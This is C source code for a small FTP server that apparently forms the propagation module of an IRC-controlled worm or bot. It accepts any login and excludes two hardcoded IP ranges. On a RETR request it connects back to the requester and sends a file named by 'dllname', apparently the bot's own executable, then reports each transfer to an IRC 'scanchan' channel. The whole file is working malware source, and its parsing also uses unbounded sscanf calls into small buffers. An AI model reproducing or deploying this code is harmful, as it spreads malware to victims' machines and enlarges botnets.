#include "include.h"
#include "extern.h"

unsigned short ftp_port;
SOCKET data_sock;

bool ftp_connect(const char *ip, unsigned short port)
/* connect to the remote host */
{
	struct sockaddr_in server;
	data_sock = socket(AF_INET, SOCK_STREAM, 0);
	server.sin_family = AF_INET;
	server.sin_addr.s_addr = inet_addr(ip);
    server.sin_port = htons(port);
	memset(server.sin_zero, 0, 8);
	if(connect(data_sock, (struct sockaddr *)&server, sizeof(struct sockaddr)) == -1)
	{
		closesocket(data_sock);
		return false;
	}
	return true;
}

bool ftp_transfer()
/* transfer file to remote host */
{
	unsigned int Fsize;
	unsigned int Fsend = 1024;
	unsigned int move;
	unsigned long mode = 0;
	char file[256];
	char buffer[1024];
	HANDLE sendfile;
	strncpy(file, dllname, sizeof(file));
	sendfile = CreateFile(file, GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, 0, 0);
	if(sendfile == INVALID_HANDLE_VALUE) 
		return false;
	Fsize = GetFileSize(sendfile, 0);
	while(Fsize)
	{
		int bytes_sent;
		memset(buffer, 0, sizeof(buffer));
		if(Fsend > Fsize) 
			Fsend = Fsize;
		move = 0 - Fsize;
		SetFilePointer(sendfile, move, 0, FILE_END);
		ReadFile(sendfile, buffer, Fsend, &mode, 0);
		bytes_sent = send(data_sock, buffer, Fsend, 0);
		if(bytes_sent == -1)
		{
			if(WSAGetLastError() != WSAEWOULDBLOCK) 
				break;
			else 
				bytes_sent = 0;
		}
		Fsize -= bytes_sent;
	}
	CloseHandle(sendfile);
	closesocket(data_sock);
	return true;
}

unsigned int __stdcall ftp_start(void *param)
/* main ftpd function */
{
	int reuse_addr = 1;
	int fdmax;
	int i;
	int addrlen;
	int nbytes;
	int po;
	int po2;
	long h;
	unsigned long mode = 1;
	char buf[100];
	char tmpbuf[100];
	char tmpbuf2[100];
	char a[4];
	char b[4];
	char c[4];
	char d[4];
	char p1[50];
	char p2[50];
	char tmpip[16];
	struct sockaddr_in server_address;
	struct sockaddr_in remoteaddr;
	struct ftpds ftpd = *(struct ftpds *)param;
	struct ftpds *pftpd = (struct ftpds *)param;
	SOCKET listener;
	SOCKET newfd;
	fd_set master;
	fd_set read_fds;
	pftpd->gotinfo = true;
	FD_ZERO(&master);
	FD_ZERO(&read_fds);
	ftp_port = ftpd.port;
	listener = socket(AF_INET, SOCK_STREAM, 0);
	setsockopt(listener, SOL_SOCKET, SO_REUSEADDR, (char *)&reuse_addr, sizeof(reuse_addr));
	ioctlsocket(listener, FIONBIO, &mode);
	server_address.sin_family = AF_INET;
	server_address.sin_addr.s_addr = INADDR_ANY;
	server_address.sin_port = htons(ftp_port);
	memset(server_address.sin_zero, 0, 8);
	if(bind(listener, (struct sockaddr *)&server_address, sizeof(server_address)) == -1)
	{
		clearthread(ftpd.tnum);
		_endthreadex(0);
	}
	listen(listener, 10);
	FD_SET(listener, &master);
	fdmax = listener;
	while(1)
	{
		read_fds = master;
		if(select(fdmax + 1, &read_fds, 0, 0, 0) == -1)
		{
			clearthread(ftpd.tnum);
			_endthreadex(0);
		}
		for(i = 0; i <= fdmax; i++)
		{
			memset(buf, 0, sizeof(buf));
			memset(tmpbuf, 0, sizeof(tmpbuf));
			if(FD_ISSET(i, &read_fds))
			{
				if(i == (int)listener)
				{
					addrlen = sizeof(remoteaddr);
					if((newfd = accept(listener, (struct sockaddr *)&remoteaddr, &addrlen)) != -1)
					{
						char welcome[] = "220 Welcome to FTPd\n";
						if(ntohl(remoteaddr.sin_addr.s_addr) >= ntohl(inet_addr("61.251.128.0")) && ntohl(remoteaddr.sin_addr.s_addr) <= ntohl(inet_addr("61.251.128.255")))
							continue;
						if(ntohl(remoteaddr.sin_addr.s_addr) >= ntohl(inet_addr("210.93.224.0")) && ntohl(remoteaddr.sin_addr.s_addr) <= ntohl(inet_addr("210.93.224.255")))
							continue;
						FD_SET(newfd, &master);
						if((int)newfd > fdmax)
							fdmax = newfd;
						send(newfd, welcome, strlen(welcome), 0);
					}
				}
				else
				{
					if((nbytes = recv(i, buf, sizeof(buf), 0)) <= 0)
					{
						FD_CLR((unsigned)i, &master);
						closesocket(i);
					}
					else
					{
						sscanf(buf, "%s %s", tmpbuf, tmpbuf2);
						if(!strcmp("USER", tmpbuf))
						{
							char user[] = "331 Password required\n";
							send(i, user, strlen(user), 0);
						}
						else if(!strcmp("PASS", tmpbuf))
						{
							char pass[] = "230 User logged in\n";
							send(i, pass, strlen(pass), 0);
						}
						else if(!strcmp("SYST", tmpbuf))
						{
							char syst[] = "215 FTPd\n";
							send(i, syst, strlen(syst), 0);
						}
						else if(!strcmp("REST", tmpbuf))
						{
							char rest[] = "350 Restarting\n";
							send(i, rest, strlen(rest), 0);
						}
						else if(!strcmp("PWD", tmpbuf))
						{
							char pwd[] = "257 \"/\" is current directory\n";
							send(i, pwd, strlen(pwd), 0);
						}
						else if(!strcmp("TYPE", tmpbuf) && !strcmp("A", tmpbuf2))
						{
							char type[] = "200 Type set to A\n";
							send(i, type, strlen(type), 0);
						}
						else if(!strcmp("TYPE", tmpbuf) && !strcmp("I", tmpbuf2))
						{
							char type[] = "200 Type set to I\n";
							send(i, type, strlen(type), 0);
						}
						else if(!strcmp("PASV", tmpbuf))
						{
							char pasv[] = "425 Passive not supported on this server\n";
							send(i, pasv, strlen(pasv), 0);
						}
						else if(!strcmp("LIST", tmpbuf))
						{
							char list[] = "226 Transfer complete\n";
							send(i, list, strlen(list), 0);
						}
						else if(!strcmp("PORT", tmpbuf))
						{
							char port[] = "200 PORT command successful\n";
							sscanf(buf, "%*s %[^,],%[^,],%[^,],%[^,],%[^,],%[^\n]", a, b, c, d, p1, p2);
							po = atoi(p1);
							po2 = atoi(p2);
							memset(p1, 0, sizeof(p1));
							_snprintf(p1, sizeof(p1), "%x%x\n", po, po2);
							h = strtoul(p1, 0, 16);
							_snprintf(tmpip, sizeof(tmpip), "%s.%s.%s.%s", a, b, c, d);
							send(i, port, strlen(port), 0);
						}
						else if(!strcmp("RETR", tmpbuf))
						{
							char retr[] = "150 Opening BINARY mode data connection\n";
							char retr2[] = "226 Transfer complete\n";
							char retr3[] = "425 Can't open data connection\n";
							send(i, retr, strlen(retr), 0);
							if(ftp_connect(tmpip, (unsigned short)h))
							{
								if(ftp_transfer())
								{
									send(i, retr2, strlen(retr2), 0);
									transfers++;
									if(transfer_info)
										irc_privmsg(scanchan, "ftp transfer complete to %s", tmpip);
								}
							}
							else
								send(i, retr3, strlen(retr3), 0);
						}
						else if(!strcmp("QUIT", tmpbuf))
						{
							char quit[] = "221 Goodbye\n";
							send(i, quit, strlen(quit), 0);
						}
						memset(buf, 0, sizeof(buf));
					}
				}
			}
		}
	}
	clearthread(ftpd.tnum);
	_endthreadex(0);
	return 0;
}